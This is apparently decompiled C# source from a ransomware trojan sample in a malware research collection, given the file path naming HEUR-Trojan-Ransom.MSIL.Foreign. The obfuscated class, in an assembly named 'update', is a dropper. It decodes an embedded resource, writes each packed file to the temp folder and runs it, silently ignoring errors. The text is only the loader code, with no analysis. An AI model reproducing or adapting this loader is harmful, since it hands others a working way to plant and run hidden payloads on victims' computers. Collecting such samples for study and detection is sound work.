// Decompiled with JetBrains decompiler
// Type: ր֬ᏉṢᡄẼ஗ᱻసҡƬོᒉࢲʗᎎཛྷ.˛ଛၑႂׅṲᏆྺ֓ᴈ៮Ꮁࠉၪֶߤ
// Assembly: update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E0159D6-932F-4F32-8DCB-751F61B22DA0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-1e13fd2b44573360e0d5f6cc2d3a4e1161d119837d808fac0c43885d53ec395f.exe

using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ;

namespace ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ
{
  internal class \u02DBଛၑႂׅṲᏆྺ֓ᴈ\u17EEᎱࠉၪֶߤ
  {
    public static void \u10CBमሃᢳᬠᚌᑘ়\u12B7ᓙ֛\u0FE9ᴗǫ\u0A80ᓉ٩() => new Thread((ThreadStart) (() =>
    {
      BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(\u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.Ꮷ\u0DCCڪᘺౢᇺ\u1AFEơॊ((byte[]) new ResourceManager("b", Assembly.GetExecutingAssembly()).GetObject("b"), false)));
      while (binaryReader.PeekChar() != -1)
      {
        string str = binaryReader.ReadString();
        int count = binaryReader.ReadInt32();
        byte[] bytes = binaryReader.ReadBytes(count);
        try
        {
          if (!File.Exists(Path.GetTempPath() + str))
            File.WriteAllBytes(Path.GetTempPath() + str, bytes);
          Process.Start(Path.GetTempPath() + str);
        }
        catch
        {
        }
      }
    })).Start();
  }
}
